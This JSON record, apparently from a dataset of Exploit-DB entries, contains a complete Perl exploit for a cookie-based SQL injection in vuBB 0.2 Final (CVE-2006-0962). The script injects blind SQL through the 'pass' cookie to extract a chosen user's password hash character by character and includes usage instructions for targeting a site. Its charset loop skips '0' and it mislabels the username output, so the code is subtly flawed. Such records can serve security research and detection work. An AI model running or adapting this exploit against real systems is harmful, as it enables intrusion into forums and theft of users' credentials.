{
  "id": "1543",
  "title": "vuBB 0.2 Final - &#039;cookie&#039; SQL Injection",
  "cve": "CVE-2006-0962",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/perl \r\nprint q{\r\n----------------------------------------------------------------------\r\n\r\n\tvuBB <=0.2 Final Remote SQL Injection (cookies) Exploit\r\n\t\r\n\t\texploit discovered and coded by KingOfSKa\r\n\t\t\t\r\n\t\t\thttps://contropotere.netsons.org\r\n\r\n----------------------------------------------------------------------\r\n\r\n};\r\n\r\nuse LWP::UserAgent;\r\n\r\n   $ua = new LWP::UserAgent;\r\n   $ua->agent(\"Mosiac 1.0\" . $ua->agent);\r\n\r\nif (!$ARGV[0]) {$ARGV[0] = '';}\r\nif (!$ARGV[1]) {$ARGV[1] = '1';}\r\n\r\nmy $path = $ARGV[0] . '/index.php';\r\nmy $user = $ARGV[1];   # userid to jack\r\nmy $uname = $ARGV[2];\r\nmy $answer = \"\";\r\nmy @charset = (\"0\",\"1\",\"2\",\"3\",\"4\",\"5\",\"6\",\"7\",\"8\",\"9\",\"a\",\"b\",\"c\",\"d\",\"e\",\"f\");\r\nif (!$ARGV[2])\r\n{\r\n        print q{\r\n\t\tUsage:\r\n\t\t\r\n\t\tperl vubb.pl FULL_URL_TO_VBB VICTIM_USER_ID USER_NICKNAME\r\n\t\tperl vubb.pl http://www.somesite.com/vubb 1 administrator\r\n\t\t\r\n\t\t};\r\nexit();\r\n\r\n}\r\nprint \"[URL:] $path\\r\\n\";\r\nprint \"[USERID:] $user\\r\\n\";\r\nprint \"[USERNAME:] $user\\r\\n\";\r\nprint \"Starting connection...\\r\\n\";\r\n\r\nmy $j = 0 ;\r\nfor( $i=1; $i < 33; $i++ )\r\n{\r\n        for( $j=1; $j < 17; $j++ )\r\n        {\r\n\t\r\n                $current = $charset[$j];\r\n\t\t\r\n  my $sql = \"99%27+OR+(id%3d\".$user.\"+AND+MID(pass,\".$i.\",1)%3d%27\".$charset[$j].\"%27)/*\"; \r\n                my @cookie = ('Cookie' => \"user=kingofska; pass=$sql;\");\r\n                my $res = $ua->get($path, @cookie);\r\n\r\n                $answer = $res->content;\r\n\t\t#print $answer; #Just for debugging...\r\n\t\tif ($answer =~/(.*)Welcome $uname(.*)/){$outputs.= $current; print \"$i/32 found...\\r\\n\"; }\r\n\t}\r\n\r\n \r\n}\r\n\r\n\r\nif ( length($outputs) < 1 )   { print \"Not Exploitable!\\r\\n\"; exit;     }\r\nprint  \"User Hash is: $outputs \\r\\n\";\r\nexit;\r\n\r\n# milw0rm.com [2006-03-01]",
  "url": "https://www.exploit-db.com/exploits/1543"
}